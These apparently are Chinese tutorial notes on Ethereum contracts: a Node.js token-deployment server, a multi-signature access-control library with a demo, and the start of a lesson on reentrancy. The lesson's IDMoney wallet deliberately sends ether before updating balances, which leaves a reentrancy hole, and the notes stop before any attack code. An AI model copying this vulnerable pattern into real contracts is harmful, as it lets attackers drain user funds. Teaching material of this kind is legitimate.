var standardtokenABI = '0x608060405234801561001057600080fd5b50604051610bca380380610bca8339810160409081528151602080840151838501516060860151336000908152600585529586208590556003859055918601805194969095919492019261006792908601906100ab565b50805161007b9060019060208401906100ab565b50506002805460ff90921660ff19909216919091179055505060048054600160a060020a03191633179055610146565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100ec57805160ff1916838001178555610119565b82800160010185558215610119579182015b828111156101195782518255916020019190600101906100fe565b50610125929150610129565b5090565b61014391905b80821115610125576000815560010161012f565b90565b610a75806101556000396000f3006080604052600436106100b95763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166306fdde0381146100be578063095ea7b31461014857806318160ddd1461018057806323b872dd146101a7578063313ce567146101d157806366188463146101fc57806370a08231146102205780638da5cb5b1461024157806395d89b4114610272578063a9059cbb14610287578063d73dd623146102ab578063dd62ed3e146102cf575b600080fd5b3480156100ca57600080fd5b506100d36102f6565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561010d5781810151838201526020016100f5565b50505050905090810190601f16801561013a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015457600080fd5b5061016c600160a060020a0360043516602435610384565b604080519115158252519081900360200190f35b34801561018c57600080fd5b506101956103ea565b60408051918252519081900360200190f35b3480156101b357600080fd5b5061016c600160a060020a03600435811690602435166044356103f0565b3480156101dd57600080fd5b506101e661066d565b6040805160ff9092168252519081900360200190f35b34801561020857600080fd5b5061016c600160a060020a0360043516602435610676565b34801561022c57600080fd5b50610195600160a060020a0360043516610765565b34801561024d57600080fd5b50610256610780565b60408051600160a060020a039092168252519081900360200190f35b34801561027e57600080fd5b506100d361078f565b34801561029357600080fd5b5061016c600160a060020a03600435166024356107e9565b3480156102b757600080fd5b5061016c600160a060020a0360043516602435610960565b3480156102db57600080fd5b50610195600160a060020a03600435811690602435166109f9565b6000805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561037c5780601f106103515761010080835404028352916020019161037c565b820191906000526020600020905b81548152906001019060200180831161035f57829003601f168201915b505050505081565b336000818152600660209081526040808320600160a060020a038716808552908352818420869055815186815291519394909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925928290030190a350600192915050565b60035490565b600160a060020a038316600090815260056020526040812054821115610460576040805160e560020a62461bcd02815260206004820152601f60248201527f66726f6d27732062616c616e636520697320756e73756666696369656e742e00604482015290519081900360640190fd5b600160a060020a0384166000908152600660209081526040808320338452909152902054821115610500576040805160e560020a62461bcd028152602060048201526024808201527f76616c756520746f206265207472616e73666572656420697320756e6170707260448201527f6f76656400000000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b600160a060020a0383161515610560576040805160e560020a62461bcd02815260206004820152601760248201527f746f2773206164647265737320697320696e76616c6964000000000000000000604482015290519081900360640190fd5b600160a060020a038416600090815260056020526040902054610589908363ffffffff610a2416565b600160a060020a0380861660009081526005602052604080822093909355908516815220546105be908363ffffffff610a3616565b600160a060020a038085166000908152600560209081526040808320949094559187168152600682528281203382529091522054610602908363ffffffff610a2416565b600160a060020a03808616600081815260066020908152604080832033845282529182902094909455805186815290519287169391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef929181900390910190a35060019392505050565b60025460ff1681565b336000908152600660209081526040808320600160a060020a03861684529091528120548083106106ca57336000908152600660209081526040808320600160a060020a03881684529091528120556106ff565b6106da818463ffffffff610a2416565b336000908152600660209081526040808320600160a060020a03891684529091529020555b336000818152600660209081526040808320600160a060020a0389168085529083529281902054815190815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a35060019392505050565b600160a060020a031660009081526005602052604090205490565b600454600160a060020a031681565b60018054604080516020600284861615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561037c5780601f106103515761010080835404028352916020019161037c565b33600090815260056020526040812054821115610850576040805160e560020a62461bcd02815260206004820152601860248201527f62616c616e636520697320756e73756666696369656e742e0000000000000000604482015290519081900360640190fd5b600160a060020a03831615156108b0576040805160e560020a62461bcd02815260206004820152601a60248201527f746172676574206164647265737320697320696e76616c69642e000000000000604482015290519081900360640190fd5b336000908152600560205260409020546108d0908363ffffffff610a2416565b3360009081526005602052604080822092909255600160a060020a03851681522054610902908363ffffffff610a3616565b600160a060020a0384166000818152600560209081526040918290209390935580518581529051919233927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a350600192915050565b336000908152600660209081526040808320600160a060020a0386168452909152812054610994908363ffffffff610a3616565b336000818152600660209081526040808320600160a060020a0389168085529083529281902085905580519485525191937f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929081900390910190a350600192915050565b600160a060020a03918216600090815260066020908152604080832093909416825291909152205490565b600082821115610a3057fe5b50900390565b81810182811015610a4357fe5b929150505600a165627a7a723058206cb3f3c3ad6606c63a33018a09e2fda800ac506cc90340b9f23dec2e9b2048660029';

http.createServer(function(req, res) {
	var postData = '';
	req.setEncoding('utf-8');
	req.addListener("data", function (postDataChunk) {
		postData += postDataChunk;
	});
	req.addListener("end", function () {
		var params;
		try {
			params = JSON.parse(postData);
		} catch(e) {
			res.writeHead(200, {'Content-Type': 'application/json'});
			var body = '{"error": -1, "errMsg": "failed to parse request data."';
			res.write(body);
			res.end();

			console.log("url: ", req.url, ", method: ", req.method,
				", params: ", params);

			return;
		}

		var initialSupply = params.initialSupply;
		var tokenName = params.tokenName;
		var decimalUnits = params.decimalUnits;
		var tokenSymbol = params.tokenSymbol;

		if (typeof initialSupply === 'undefined' ||
			typeof tokenName === 'undefined' ||
			typeof decimalUnits === 'undefined' ||
			typeof tokenSymbol === 'undefined') {
			res.writeHead(200, {'Content-Type': 'application/json'});
			var body = '{"error": -2, "errMsg": "failed to validate params."';
			res.write(body);
			res.end();

			console.log("initialSupply: ", initialSupply, ", ",
				"tokenName: ", tokenName, ", ",
				"decimalUnits: ", decimalUnits, ", ",
				"tokenSymbol: ", tokenSymbol);

			return;
		}

		console.log("+++ initialSupply: ", initialSupply, ", ",
			"tokenName: ", tokenName, ", ",
			"decimalUnits: ", decimalUnits, ", ",
			"tokenSymbol: ", tokenSymbol);


		var standardtoken = standardtokenContract.new(
			initialSupply,
			tokenName,
			decimalUnits,
			tokenSymbol,
			{
				from: web3.eth.accounts[0],
				data: standardtokenABI,
				gas: '4700000'
			},
			function (e, contract) {
				//console.log(e, contract);
				if (typeof contract.address !== 'undefined') {
					console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
					res.writeHead(200, {'Content-Type': 'application/json'});
					var body = '{"erro": 0, "address": "' + contract.address + '", "hash": "' + contract.transactionHash + '"}';
					res.write(body);
					res.end();
				}
			}
		);
	});

}).listen(12306); // the server object listens on port 12306
```

客户端可以通过 curl 访问，如下所示

```bash
curl http://localhost:12306 -d '{"initialSupply":1000,"tokenName":"Hello World Token","decimalUnits":18,"tokenSymbol":"HWT"}'
{"erro": 0, "address": "0x4aa8abdc9361040689154f28e9fbf6229862d6ca", "hash": "0xd32d279af7b4d4b9f47167caeca0b0c2e8db0698a367aadc6868050251a20e1c"}
```

### 以太坊智能合约安全：函数多签

借助于 `MSFun` 提供的函数多签基础库，封装成权限控制合约 `Auth`，在应用合约 `Demo` 使用权限控制合约 `Auth`

##### 函数多签基础库

```javascript
pragma solidity ^0.4.24;

/** @title -MSFun- v0.2.4
 *
 *         ┌──────────────────────────────────────────────────────────────────────┐
 *         │ MSFun, is an importable library that gives your contract the ability │
 *         │ add multiSig requirement to functions.                               │
 *         └──────────────────────────────────────────────────────────────────────┘
 *                                ┌────────────────────┐
 *                                │ Setup Instructions │
 *                                └────────────────────┘
 * (Step 1) import the library into your contract
 *
 *    import "./MSFun.sol";
 *
 * (Step 2) set up the signature data for msFun
 *
 *     MSFun.Data private msData;
 *                                ┌────────────────────┐
 *                                │ Usage Instructions │
 *                                └────────────────────┘
 * at the beginning of a function
 *
 *     function functionName()
 *     {
 *         if (MSFun.multiSig(msData, required signatures, "functionName") == true)
 *         {
 *             MSFun.deleteProposal(msData, "functionName");
 *
 *             // put function body here
 *         }
 *     }
 *                           ┌────────────────────────────────┐
 *                           │ Optional Wrappers For TeamJust │
 *                           └────────────────────────────────┘
 * multiSig wrapper function (cuts down on inputs, improves readability)
 * this wrapper is HIGHLY recommended
 *
 *     function multiSig(bytes32 _whatFunction) private returns (bool) {return(MSFun.multiSig(msData, TeamJust.requiredSignatures(), _whatFunction));}
 *     function multiSigDev(bytes32 _whatFunction) private returns (bool) {return(MSFun.multiSig(msData, TeamJust.requiredDevSignatures(), _whatFunction));}
 *
 * wrapper for delete proposal (makes code cleaner)
 *
 *     function deleteProposal(bytes32 _whatFunction) private {MSFun.deleteProposal(msData, _whatFunction);}
 *                             ┌────────────────────────────┐
 *                             │ Utility & Vanity Functions │
 *                             └────────────────────────────┘
 * delete any proposal is highly recommended.  without it, if an admin calls a multiSig
 * function, with argument inputs that the other admins do not agree upon, the function
 * can never be executed until the undesirable arguments are approved.
 *
 *     function deleteAnyProposal(bytes32 _whatFunction) onlyDevs() public {MSFun.deleteProposal(msData, _whatFunction);}
 *
 * for viewing who has signed a proposal & proposal data
 *
 *     function checkData(bytes32 _whatFunction) onlyAdmins() public view returns(bytes32, uint256) {return(MSFun.checkMsgData(msData, _whatFunction), MSFun.checkCount(msData, _whatFunction));}
 *
 * lets you check address of up to 3 signers (address)
 *
 *     function checkSignersByAddress(bytes32 _whatFunction, uint256 _signerA, uint256 _signerB, uint256 _signerC) onlyAdmins() public view returns(address, address, address) {return(MSFun.checkSigner(msData, _whatFunction, _signerA), MSFun.checkSigner(msData, _whatFunction, _signerB), MSFun.checkSigner(msData, _whatFunction, _signerC));}
 *
 * same as above but will return names in string format.
 *
 *     function checkSignersByName(bytes32 _whatFunction, uint256 _signerA, uint256 _signerB, uint256 _signerC) onlyAdmins() public view returns(bytes32, bytes32, bytes32) {return(TeamJust.adminName(MSFun.checkSigner(msData, _whatFunction, _signerA)), TeamJust.adminName(MSFun.checkSigner(msData, _whatFunction, _signerB)), TeamJust.adminName(MSFun.checkSigner(msData, _whatFunction, _signerC)));}
 *                             ┌──────────────────────────┐
 *                             │ Functions In Depth Guide │
 *                             └──────────────────────────┘
 * In the following examples, the Data is the proposal set for this library.  And
 * the bytes32 is the name of the function.
 *
 * MSFun.multiSig(Data, uint256, bytes32) - Manages creating/updating multiSig
 *      proposal for the function being called.  The uint256 is the required
 *      number of signatures needed before the multiSig will return true.
 *      Upon first call, multiSig will create a proposal and store the arguments
 *      passed with the function call as msgData.  Any admins trying to sign the
 *      function call will need to send the same argument values. Once required
 *      number of signatures is reached this will return a bool of true.
 *
 * MSFun.deleteProposal(Data, bytes32) - once multiSig unlocks the function body,
 *      you will want to delete the proposal data.  This does that.
 *
 * MSFun.checkMsgData(Data, bytes32) - checks the message data for any given proposal
 *
 * MSFun.checkCount(Data, bytes32) - checks the number of admins that have signed
 *      the proposal
 *
 * MSFun.checkSigners(data, bytes32, uint256) - checks the address of a given signer.
 *      the uint256, is the log number of the signer (ie 1st signer, 2nd signer)
 */

library MSFun {
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // DATA SETS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // contact data setup
    struct Data
    {
        mapping (bytes32 => ProposalData) proposal_;
    }
    struct ProposalData
    {
        // a hash of msg.data
        bytes32 msgData;
        // number of signers
        uint256 count;
        // tracking of wither admins have signed
        mapping (address => bool) admin;
        // list of admins who have signed
        mapping (uint256 => address) log;
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // MULTI SIG FUNCTIONS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    function multiSig(Data storage self, uint256 _requiredSignatures, bytes32 _whatFunction)
        internal
        returns(bool)
    {
        // our proposal key will be a hash of our function name + our contracts address
        // by adding our contracts address to this, we prevent anyone trying to circumvent
        // the proposal's security via external calls.
        bytes32 _whatProposal = whatProposal(_whatFunction);

        // this is just done to make the code more readable.  grabs the signature count
        uint256 _currentCount = self.proposal_[_whatProposal].count;

        // store the address of the person sending the function call.  we use msg.sender
        // here as a layer of security.  in case someone imports our contract and tries to
        // circumvent function arguments.  still though, our contract that imports this
        // library and calls multisig, needs to use onlyAdmin modifiers or anyone who
        // calls the function will be a signer.
        address _whichAdmin = msg.sender;

        // prepare our msg data.  by storing this we are able to verify that all admins
        // are approving the same argument input to be executed for the function.  we hash
        // it and store in bytes32 so its size is known and comparable
        bytes32 _msgData = keccak256(msg.data);

        // check to see if this is a new execution of this proposal or not
        if (_currentCount == 0)
        {
            // if it is, lets record the original signers data
            self.proposal_[_whatProposal].msgData = _msgData;

            // record original senders signature
            self.proposal_[_whatProposal].admin[_whichAdmin] = true;

            // update log (used to delete records later, and easy way to view signers)
            // also useful if the calling function wants to give something to a
            // specific signer.
            self.proposal_[_whatProposal].log[_currentCount] = _whichAdmin;

            // track number of signatures
            self.proposal_[_whatProposal].count += 1;

            // if we now have enough signatures to execute the function, lets
            // return a bool of true.  we put this here in case the required signatures
            // is set to 1.
            if (self.proposal_[_whatProposal].count == _requiredSignatures) {
                return(true);
            }
        // if its not the first execution, lets make sure the msgData matches
        } else if (self.proposal_[_whatProposal].msgData == _msgData) {
            // msgData is a match
            // make sure admin hasnt already signed
            if (self.proposal_[_whatProposal].admin[_whichAdmin] == false)
            {
                // record their signature
                self.proposal_[_whatProposal].admin[_whichAdmin] = true;

                // update log (used to delete records later, and easy way to view signers)
                self.proposal_[_whatProposal].log[_currentCount] = _whichAdmin;

                // track number of signatures
                self.proposal_[_whatProposal].count += 1;
            }

            // if we now have enough signatures to execute the function, lets
            // return a bool of true.
            // we put this here for a few reasons.  (1) in normal operation, if
            // that last recorded signature got us to our required signatures.  we
            // need to return bool of true.  (2) if we have a situation where the
            // required number of signatures was adjusted to at or lower than our current
            // signature count, by putting this here, an admin who has already signed,
            // can call the function again to make it return a true bool.  but only if
            // they submit the correct msg data
            if (self.proposal_[_whatProposal].count == _requiredSignatures) {
                return(true);
            }
        }
    }


    // deletes proposal signature data after successfully executing a multiSig function
    function deleteProposal(Data storage self, bytes32 _whatFunction)
        internal
    {
        //done for readability sake
        bytes32 _whatProposal = whatProposal(_whatFunction);
        address _whichAdmin;

        //delete the admins votes & log.   i know for loops are terrible.  but we have to do this
        //for our data stored in mappings.  simply deleting the proposal itself wouldn't accomplish this.
        for (uint256 i=0; i < self.proposal_[_whatProposal].count; i++) {
            _whichAdmin = self.proposal_[_whatProposal].log[i];
            delete self.proposal_[_whatProposal].admin[_whichAdmin];
            delete self.proposal_[_whatProposal].log[i];
        }
        //delete the rest of the data in the record
        delete self.proposal_[_whatProposal];
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // HELPER FUNCTIONS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

    function whatProposal(bytes32 _whatFunction)
        private
        view
        returns(bytes32)
    {
        return(keccak256(abi.encodePacked(_whatFunction,this)));
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // VANITY FUNCTIONS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // returns a hashed version of msg.data sent by original signer for any given function
    function checkMsgData (Data storage self, bytes32 _whatFunction)
        internal
        view
        returns (bytes32 msg_data)
    {
        bytes32 _whatProposal = whatProposal(_whatFunction);
        return (self.proposal_[_whatProposal].msgData);
    }

    // returns number of signers for any given function
    function checkCount (Data storage self, bytes32 _whatFunction)
        internal
        view
        returns (uint256 signature_count)
    {
        bytes32 _whatProposal = whatProposal(_whatFunction);
        return (self.proposal_[_whatProposal].count);
    }

    // returns address of an admin who signed for any given function
    function checkSigner (Data storage self, bytes32 _whatFunction, uint256 _signer)
        internal
        view
        returns (address signer)
    {
        require(_signer > 0, "MSFun checkSigner failed - 0 not allowed");
        bytes32 _whatProposal = whatProposal(_whatFunction);
        return (self.proposal_[_whatProposal].log[_signer - 1]);
    }
}
```

##### 权限控制合约

```javascript
pragma solidity ^0.4.24;

import "./MSFun.sol";

contract Auth {
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // SET UP MSFun (note, check signers by name is modified from MSFun sdk)
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    MSFun.Data private msData;
    function deleteAnyProposal(bytes32 _whatFunction) onlyDevs() public {MSFun.deleteProposal(msData, _whatFunction);}
    function checkData(bytes32 _whatFunction) onlyAdmins() public view returns(bytes32 message_data, uint256 signature_count) {return(MSFun.checkMsgData(msData, _whatFunction), MSFun.checkCount(msData, _whatFunction));}
    function checkSignersByName(bytes32 _whatFunction, uint256 _signerA, uint256 _signerB, uint256 _signerC) onlyAdmins() public view returns(string, string, string) {return(this.adminName(MSFun.checkSigner(msData, _whatFunction, _signerA)), this.adminName(MSFun.checkSigner(msData, _whatFunction, _signerB)), this.adminName(MSFun.checkSigner(msData, _whatFunction, _signerC)));}

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // DATA SETUP
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    struct Admin {
        bool isAdmin;
        bool isDev;
        string name;
    }
    mapping (address => Admin) admins_;

    uint256 adminCount_;
    uint256 devCount_;
    uint256 requiredSignatures_;
    uint256 requiredDevSignatures_;

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // CONSTRUCTOR
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    constructor()
        public
    {
        address laowang = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c;
        address zeus    = 0x14723a09acff6d2a60dcdf7aa4aff308fddc160c;

        admins_[laowang]  = Admin(true, true, "laowang");  // admin only
        admins_[zeus]     = Admin(true, true, "zeus");      // admin & dev

        adminCount_ = 2;
        devCount_ = 2;

        requiredSignatures_ = 2;
        requiredDevSignatures_ = 2;
    }
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // FALLBACK
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    function ()
        public
    {
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // MODIFIERS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    modifier onlyDevs()
    {
        require(admins_[msg.sender].isDev == true, "onlyDevs failed - msg.sender is not a dev");
        _;
    }

    modifier onlyAdmins()
    {
        require(admins_[msg.sender].isAdmin == true, "onlyAdmins failed - msg.sender is not an admin");
        _;
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // DEV ONLY FUNCTIONS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    /**
    * @dev DEV - use this to add admins.  this is a dev only function.
    * @param _who - address of the admin you wish to add
    * @param _name - admins name
    * @param _isDev - is this admin also a dev?
    */
    function addAdmin(address _who, string _name, bool _isDev)
        public
        onlyDevs()
    {
        if (MSFun.multiSig(msData, requiredDevSignatures_, "addAdmin") == true)
        {
            MSFun.deleteProposal(msData, "addAdmin");

            // must check this so we dont mess up admin count by adding someone
            // who is already an admin
            if (admins_[_who].isAdmin == false)
            {

                // set admins flag to true in admin mapping
                admins_[_who].isAdmin = true;

                // adjust admin count and required signatures
                adminCount_ += 1;
                requiredSignatures_ += 1;
            }

            // are we setting them as a dev?
            // by putting this outside the above if statement, we can upgrade existing
            // admins to devs.
            if (_isDev == true)
            {
                // bestow the honored dev status
                admins_[_who].isDev = _isDev;

                // increase dev count and required dev signatures
                devCount_ += 1;
                requiredDevSignatures_ += 1;
            }
        }

        // by putting this outside the above multisig, we can allow easy name changes
        // without having to bother with multisig.  this will still create a proposal though
        // so use the deleteAnyProposal to delete it if you want to
        admins_[_who].name = _name;
    }

    /**
    * @dev DEV - use this to remove admins. this is a dev only function.
    * -requirements: never less than 1 admin
    *                never less than 1 dev
    *                never less admins than required signatures
    *                never less devs than required dev signatures
    * @param _who - address of the admin you wish to remove
    */
    function removeAdmin(address _who)
        public
        onlyDevs()
    {
        // we can put our requires outside the multisig, this will prevent
        // creating a proposal that would never pass checks anyway.
        require(adminCount_ > 1, "removeAdmin failed - cannot have less than 2 admins");
        require(adminCount_ >= requiredSignatures_, "removeAdmin failed - cannot have less admins than number of required signatures");
        if (admins_[_who].isDev == true)
        {
            require(devCount_ > 1, "removeAdmin failed - cannot have less than 2 devs");
            require(devCount_ >= requiredDevSignatures_, "removeAdmin failed - cannot have less devs than number of required dev signatures");
        }

        // checks passed
        if (MSFun.multiSig(msData, requiredDevSignatures_, "removeAdmin") == true)
        {
            MSFun.deleteProposal(msData, "removeAdmin");

            // must check this so we dont mess up admin count by removing someone
            // who wasnt an admin to start with
            if (admins_[_who].isAdmin == true) {

                //set admins flag to false in admin mapping
                admins_[_who].isAdmin = false;

                //adjust admin count and required signatures
                adminCount_ -= 1;
                if (requiredSignatures_ > 1)
                {
                    requiredSignatures_ -= 1;
                }
            }

            // were they also a dev?
            if (admins_[_who].isDev == true) {

                //set dev flag to false
                admins_[_who].isDev = false;

                //adjust dev count and required dev signatures
                devCount_ -= 1;
                if (requiredDevSignatures_ > 1)
                {
                    requiredDevSignatures_ -= 1;
                }
            }
        }
    }

    /**
    * @dev DEV - change the number of required signatures.  must be between
    * 1 and the number of admins.  this is a dev only function
    * @param _howMany - desired number of required signatures
    */
    function changeRequiredSignatures(uint256 _howMany)
        public
        onlyDevs()
    {
        // make sure its between 1 and number of admins
        require(_howMany > 0 && _howMany <= adminCount_, "changeRequiredSignatures failed - must be between 1 and number of admins");

        if (MSFun.multiSig(msData, requiredDevSignatures_, "changeRequiredSignatures") == true)
        {
            MSFun.deleteProposal(msData, "changeRequiredSignatures");

            // store new setting.
            requiredSignatures_ = _howMany;
        }
    }

    /**
    * @dev DEV - change the number of required dev signatures.  must be between
    * 1 and the number of devs.  this is a dev only function
    * @param _howMany - desired number of required dev signatures
    */
    function changeRequiredDevSignatures(uint256 _howMany)
        public
        onlyDevs()
    {
        // make sure its between 1 and number of admins
        require(_howMany > 0 && _howMany <= devCount_, "changeRequiredDevSignatures failed - must be between 1 and number of devs");

        if (MSFun.multiSig(msData, requiredDevSignatures_, "changeRequiredDevSignatures") == true)
        {
            MSFun.deleteProposal(msData, "changeRequiredDevSignatures");

            // store new setting.
            requiredDevSignatures_ = _howMany;
        }
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    // EXTERNAL FUNCTIONS
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    function requiredSignatures() external view returns(uint256) {return(requiredSignatures_);}
    function requiredDevSignatures() external view returns(uint256) {return(requiredDevSignatures_);}
    function adminCount() external view returns(uint256) {return(adminCount_);}
    function devCount() external view returns(uint256) {return(devCount_);}
    function adminName(address _who) external view returns(string) {return(admins_[_who].name);}
    function isAdmin(address _who) external view returns(bool) {return(admins_[_who].isAdmin);}
    function isDev(address _who) external view returns(bool) {return(admins_[_who].isDev);}
}
```

##### 应用合约

```javascript
pragma solidity ^0.4.24;

import "./Auth.sol";

contract Demo {

    uint256     public  value = 100;
    Auth        public  auth_;
    MSFun.Data  private msData;
    function multiSigDev(bytes32 _whatFunction) private returns (bool) {
        return(MSFun.multiSig(msData, auth_.requiredDevSignatures(), _whatFunction));
    }
    function deleteProposal(bytes32 _whatFunction) private {
        MSFun.deleteProposal(msData, _whatFunction);
    }
    function deleteAnyProposal(bytes32 _whatFunction) public onlyDevs() {
        MSFun.deleteProposal(msData, _whatFunction);
    }
    function checkData(bytes32 _whatFunction) public view onlyDevs()
        returns(bytes32, uint256) {
        return(MSFun.checkMsgData(msData, _whatFunction), MSFun.checkCount(msData, _whatFunction));
    }
    function checkSignersByAddress(bytes32 _whatFunction, uint256 _signerA, uint256 _signerB, uint256 _signerC) public view onlyDevs() 
        returns(address, address, address) {
        return(
            MSFun.checkSigner(msData, _whatFunction, _signerA), 
            MSFun.checkSigner(msData, _whatFunction, _signerB), 
            MSFun.checkSigner(msData, _whatFunction, _signerC));
    }
    function checkSignersByName(bytes32 _whatFunction, uint256 _signerA, uint256 _signerB, uint256 _signerC)public view onlyDevs() 
        returns(string, string, string) {
        return (auth_.adminName(MSFun.checkSigner(msData, _whatFunction, _signerA)),
            auth_.adminName(MSFun.checkSigner(msData, _whatFunction, _signerB)), 
            auth_.adminName(MSFun.checkSigner(msData, _whatFunction, _signerC)));
    }

    modifier onlyDevs() 
    {
        require(auth_.isDev(msg.sender) == true, "msg sender is not a dev");
        _;
    }

    constructor(address _auth) public {
        require(address(_auth) != 0, "auth is invalid");
        auth_ = Auth(_auth);
    }

    function modify(uint256 _value) public 
        onlyDevs() {
        if (multiSigDev("modify") == true)
        {
            deleteProposal("modify");
            value = _value;
        }
    }

}
```

应用合约中，添加函数多签限制的函数格式如下所示（参考上述合约中函数 `modify`）

```javascript
function functionName()
	onlyDevs() {
    if (MSFun.multiSig(msData, required signatures, "functionName") == true)
    {
        MSFun.deleteProposal(msData, "functionName");

        // put function body here
    }
}
```

##### 运行过程

> 应用合约中，函数 `modify` 调用添加了多签限制：需要两名具备开发者权限的账户签名，才能执行函数 `modify` 的核心功能：修改 `value` 的值

1. 部署合约
2. 使用具备开发者权限的账户 1 签名
3. 使用具备开发者权限的账户 2 签名

使用账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 部署合约 `Auth`，然后部署合约 `Demo`

![](pic/blockchain/deploy_auth.png)

![](pic/blockchain/deploy_demo.png)

查看 `value` 的初始值 100

![](pic/blockchain/show_value.png)

若以账户`0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 调用函数 `modify` 尝试修改 `value`，报错，提示账户费开发者

![](pic/blockchain/call_modify_fail.png)

切换到具备开发者权限的账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 调用函数 `modify`

![](pic/blockchain/call_modify.png)

虽然尝试修改 `value` 为 99，但是值仍然为 100

![](pic/blockchain/show_value2.png)

切换到具备开发者权限的账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160` 调用函数 `modify`

![](pic/blockchain/call_modify2.png)

此时，`value` 被修改成了 99

![](pic/blockchain/show_value3.png)

### 以太坊智能合约安全：重入

#### 公共钱包合约

合约实现了一个类似公共钱包的代码，其中，balances 定义了一个下标为 [address] 的公共钱包，deposit 函数向钱包中调用者的位置存入相应的 value 值，withdraw 函数检查提币账户的余额与该合约资产是否大于参数 amount，之后向 to 地址发送相应 ether。

```javascript
pragma solidity ^0.4.19;

contract IDMoney{
    address _owner;
    mapping (address => uint256) balances;

    function IDMoney() {
        _owner = msg.sender;
    }
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw(address to, uint256 amount) public payable {
        require(balances[msg.sender] >= amount);
        require(this.balance >= amount);

        to.call.value(amount)();
        balances[msg.sender] -= amount;
    }
    function balanceof(address to) constant returns(uint256){
        return balances[to];
    }
}
```

#### 三种转币函数

Solidity 中 `<address>.transfer()`，`<address>.send()` 和 `<address>.call.vale()()` 都可以用于向某一地址发送 ether，他们的区别在于：

 `<address>.transfer()`

- 当发送失败时会 `throw`，回滚状态
- 只会传递 2300 Gas 供调用，防止重入（reentrancy）

`<address>.send()`

- 当发送失败时会返回 false 布尔值
- 只会传递 2300 Gas 供调用，防止重入（reentrancy）

`<address>.call.value()()`

- 当发送失败时会返回 false 布尔值
- 传递所有可用 gas 进行调用（可通过 gas(gas_value) 进行限制），不能有效防止重入（reentrancy）

#### 回退函数

> A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).

`fallback` 函数在合约实例中表现形式即为一个不带参数没有返回值的匿名函数，如下所示

```javascript
pragma solidity ^0.4.24;

contract Dummy {
    address public owner;
    
    constructor () public {
        owner = msg.sender;
    }

    // fallbakc 函数为匿名函数，一个合约示例有且只有一个，无参数和返回值
    function () public {
    }
}
```

那么什么时候会执行 `fallback` 函数呢？

- 当外部账户或其他合约向该合约地址发送 ether 时

- 当外部账户或其他合约调用了该合约一个**不存在**的函数时

